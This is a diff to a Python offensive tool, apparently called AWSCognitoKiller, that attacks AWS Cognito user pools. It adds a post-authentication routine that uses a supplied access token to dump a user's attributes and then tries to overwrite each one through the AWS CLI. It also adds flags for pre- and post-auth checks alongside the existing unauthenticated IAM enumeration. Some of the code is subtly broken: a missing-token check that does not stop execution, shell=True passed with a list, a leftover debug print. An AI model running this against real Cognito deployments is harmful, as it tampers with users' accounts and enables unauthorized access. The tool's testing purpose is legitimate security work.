@@ -8,6 +8,7 @@ import hashlib
 import hmac
 import base64
 import boto3
+from Utility import Utility
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -22,8 +23,9 @@ class ExploitAWSCognito:
 		self.userPoolId = None
 		self.cognitoSecret = None
 		self.enumiam = None
+		self.access_token = None
 
-	def update(self, clientId=None, identityPoolId=None, userPoolId=None, cognitoSecret=None, enumiam=None):
+	def update(self, clientId=None, identityPoolId=None, userPoolId=None, cognitoSecret=None, enumiam=None, accessToken=None):
 		if clientId:
 			self.region = clientId.split(":")[0]
 			self.clientId = clientId.split(":")[1]
@@ -36,6 +38,8 @@ class ExploitAWSCognito:
 			self.cognitoSecret = cognitoSecret
 		if enumiam:
 			self.enumiam = enumiam
+		if accessToken:
+			self.access_token = accessToken
 
 
 	def unauthen_exploit(self):
@@ -117,7 +121,33 @@ class ExploitAWSCognito:
 						enumerate_iam(AccessKeyId, SecretKey, SessionToken, self.region)
 
 	def postauthen_exploit(self):
-		pass
+		if self.access_token == None:
+			pass
+
+		### get user attributes
+		r = subprocess.Popen(["aws", "cognito-idp", "get-user", "--access-token", f"{self.access_token}", "--region", self.region], shell=True, stdout=PIPE, stderr=PIPE)
+		stdout, stderr = r.communicate()
+		if len(stderr) > 0:
+			self.logError(f"\t[-] {stderr}")
+		else:
+			json_stdout = json.loads(stdout)
+			self.logProc(f"[*] {self.region}:{self.clientId} - Cognito User Attributes:")
+			self.logProc(f"{json_stdout}")
+
+		### check updating permission on attributes
+			self.logProc(f"[*] {self.region}:{self.clientId} - Check updating permission on attributes ---> ")
+			for attribute in json_stdout["UserAttributes"]:
+				r = subprocess.Popen(["aws", "cognito-idp", "update-user-attributes", "--access-token", f"{self.access_token}", "--region", self.region,  "--user-attributes", f"Name={attribute['Name']},Value=edited{attribute['Value']}"], shell=True, stdout=PIPE, stderr=PIPE)
+				stdout, stderr = r.communicate()
+				if len(stderr) > 0:
+					self.logError(f"\t[-] {stderr}")
+				else:
+					self.logProc(f"\t[!] Update Attribute {attribute['Name']} - Yes")
+					self.logProc(f"\t[+] {stdout}")
+			
+
+
+		
 
 
 	def logProc(self, message):
@@ -129,23 +159,29 @@ class ExploitAWSCognito:
 
 
 if __name__ == "__main__":
+	if not Utility.is_tool("aws"):
+		print(f"[#] Please install AWS CLI first !!!")
+		exit()
 	msg = "AWSCognitoKiller\nregion + username + password are required!!!\nExample Usage: python .\AWSCognitoKiller.py -region \"us-east-1\" -userPoolId \"us-east-1_f969OmVb5\" -clientId \"72ivtupb7fe0u5naa3jpu720k7\" -username \"ltidi@wearehackerone.com\" -password \"Abcd@1234\""
 	parser = argparse.ArgumentParser(description=msg)
 	parser.add_argument("-region", "--region", help = "Application Region")
 	parser.add_argument("-userPoolId", "--user-pool-id", help = "User Pool ID")
 	parser.add_argument("-clientId", "--client-id", help = "Client ID")
 	parser.add_argument("-identityPoolId", "--identity-pool-id", help = "Identity Pool ID")
-	parser.add_argument("-username", "--username", help = "Username")
-	parser.add_argument("-password", "--password", help = "Password")
-	parser.add_argument("-enumiam", "--enum-iam", help = "Enum IAM")
 	parser.add_argument("-cognitosecret", "--cognito-secret", help = "Cognito Secret")
+	parser.add_argument("-username", "--username", help = "Username", required=True)
+	parser.add_argument("-password", "--password", help = "Password", required=True)
+	parser.add_argument("-accesstoken", "--access-token", help = "AWS Cognito Access Token", required=True)
+
+	parser.add_argument("-enumiam", "--enum-iam", help = "Enum IAM", action=argparse.BooleanOptionalAction)
+	parser.add_argument("-preauthcheck", "--preauth-check", help = "PreAuthen Check", action=argparse.BooleanOptionalAction)
+	parser.add_argument("-postauthcheck", "--postauth-check", help = "PostAuthen Check", action=argparse.BooleanOptionalAction)
+	
 
 	args = parser.parse_args()
-	if args.username == None or args.password == None:
-		print(msg)
-		exit()
+	print(args, "enum_iam" in args)
 
-	exploit_instance = ExploitAWSCognito(args.username.strip(), args.password.strip(), "enum_iam" in args)
+	exploit_instance = ExploitAWSCognito(args.username.strip(), args.password.strip(), args.enum_iam)
 
 	if args.client_id:
 		exploit_instance.update(clientId=args.client_id.strip())
@@ -153,7 +189,12 @@ if __name__ == "__main__":
 		exploit_instance.update(identityPoolId=args.identity_pool_id.strip())
 	if args.cognito_secret:
 		exploit_instance.update(cognitoSecret=args.cognito_secret.strip())
-	if args.enum_iam:
-		exploit_instance.update(enumiam=args.enum_iam.strip())
+	if args.access_token:
+		exploit_instance.update(accessToken=args.access_token.strip())
 	
-	exploit_instance.unauthen_exploit()
+	
+	if args.preauth_check:
+		exploit_instance.unauthen_exploit()
+	if args.postauth_check:
+		exploit_instance.postauthen_exploit()
+
